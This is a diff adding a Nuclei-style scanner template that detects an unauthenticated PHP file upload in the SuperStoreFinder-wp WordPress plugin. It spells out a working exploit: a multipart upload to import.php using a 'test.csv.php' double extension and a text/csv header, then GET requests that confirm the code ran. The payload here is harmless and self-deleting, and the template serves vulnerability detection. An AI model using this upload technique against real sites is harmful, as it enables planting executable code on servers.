@@ -1,0 +1,52 @@
+id: wordpress-superstorefinder-wp-file-upload
+info:
+  name: WordPress Plugin SuperStoreFinder-wp File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WordPress Plugin SuperStoreFinder-wp does not properly check file uploads. An attacker can set the Content-Type header to text/csv and use double extensions to bypass the existing checks, allowing malicious file uploads.
+  reference:
+    - https://superstorefinder.net
+  tags: file-upload,wordpress,plugin
+
+variables:
+  boundary: "---------------------------61952268337452675651047936648"
+  payload: |
+    {{boundary}}\r\nContent-Disposition: form-data; name="default_location"; filename="test.csv.php"\r\nContent-Type: text/csv\r\n\r\n<?php echo md5(233);unlink(__FILE__);?>\r\n\r\n{{boundary}}--\r\n
+
+flow: |
+  http(1) && (http(2) || http(3))
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary={{boundary}}"
+    body: "{{payload}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload-path1
+    method: GET
+    path:
+      - "/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/test.csv.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+
+  - id: verify-upload-path2
+    method: GET
+    path:
+      - "/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/test.csv.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
